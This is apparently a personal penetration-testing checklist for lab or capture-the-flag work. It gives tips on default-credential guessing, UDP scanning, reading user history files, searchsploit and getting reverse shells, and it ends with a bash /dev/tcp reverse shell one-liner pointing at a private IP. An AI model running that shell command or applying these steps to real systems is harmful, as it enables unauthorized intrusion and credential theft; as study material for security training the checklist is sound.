## DO NOT GET OVERWHELMED

- INSPECT THE SOURCE CODE FOR ANY HINTS
- ALWAYS TRY USERNAME:USERNAME as password tries
- ALWAYS DO A UDP SCAN
- look at the modified date for files of interest. If there’s anything that has a sus looking nature but it was modified last on what I suspect is the install date of the application/OS then I move on but when I see a bunch of files and folders and one random file has been modified way later than the others; that usually indicates smth. In this case using that same through process and what I mentioned above; I had context clues as to why that file might be what I need
- IF YOU HAVE TOO MUCH DATA, NOTE IT DOWN THE PORTS AND DO STEP BY STEP
- ONCE YOU FIND A CREDENTIAL, TRY EACH AND EVERY POSSIBLE WAY TO USE IT
- IF YOU FIND SOME FILES with ftp, AND THEY GIVE USERNAMES NOTE IT
- BEWARE OF RABBIT HOLES
- IF U CANNOT GET THE SHELL BACK, TRY USING PORT 80, OR ANY OF THE OPEN PORTS OF THE TARGET
- READ USER'S HISTORY FILE IF PRESENT
- IF NC SHELL DOESNT WORK TRY /BIN/BASH OR /BASH
- CHECK EXPLOITS CAREFULLY, IF IT ISN WOKRING FIND OTHER
- SEARCH ON SEARCHSPLOIT
- 


```
bin/bash -i >& /dev/tcp/192.168.45.163/443 0>&1
```